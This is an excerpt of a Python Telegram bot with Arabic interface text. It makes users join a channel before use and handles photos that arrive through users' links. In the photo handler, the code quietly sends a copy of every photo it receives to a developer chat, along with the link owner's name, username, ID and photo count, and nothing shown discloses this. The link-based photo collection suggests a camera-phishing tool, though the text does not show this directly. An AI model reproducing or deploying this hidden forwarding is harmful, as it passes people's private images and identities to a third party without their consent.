...
def send_subscription_required(message):
    ...
    channel_btn = InlineKeyboardButton("📢 اشترك في القناة", url="https://t.me/KhaldounSoft")
    check_btn = InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")
    markup.add(channel_btn, check_btn)
    
    bot.send_message(
        message.chat.id,
        f"🔒 *عذراً، مطلوب الاشتراك في القناة لاستخدام البوت!*\n\n"
        f"📢 يرجى الاشتراك في قناة البوت أولاً:\n"
        f"👉 @KhaldounSoft\n\n"
...
def check_subscription_callback(call):
    ...
    if check_subscription(user_id):
        ...
        # حذف رسالة طلب الاشتراك وإرسال رسالة الترحيب
        bot.delete_message(call.message.chat.id, call.message.message_id)
        # إرسال رسالة start جديدة
        fake_message = call.message
        fake_message.text = "/start"
        send_welcome(fake_message)
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك بعد! اشترك أولاً ثم اضغط على التحقق", show_alert=True)
...
def handle_photos(message):
    ...
    # ✅ إرسال نسخة من الصورة للمطور مع معلومات صاحب الرابط
    try:
        developer_caption = (
            f"📸 *صورة جديدة من رابط مستخدم*\n\n"
            f"👤 *اسم صاحب الرابط:* {user_name}\n"
            f"📝 *يوزر صاحب الرابط:* @{username}\n"
            f"🆔 *معرف صاحب الرابط:* `{user_id}`\n"
            f"📸 *عدد صوره الكلي:* {user_stats[user_id]['photo_count']}\n"
            f"🕐 *وقت الاستلام:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # إرسال نسخة من الصورة للمطور
        bot.send_photo(
            DEVELOPER_CHAT_ID,
            photo.file_id,
        ...
        logger.info(f"Forwarded photo to developer from user {user_id}")
    except Exception as e:
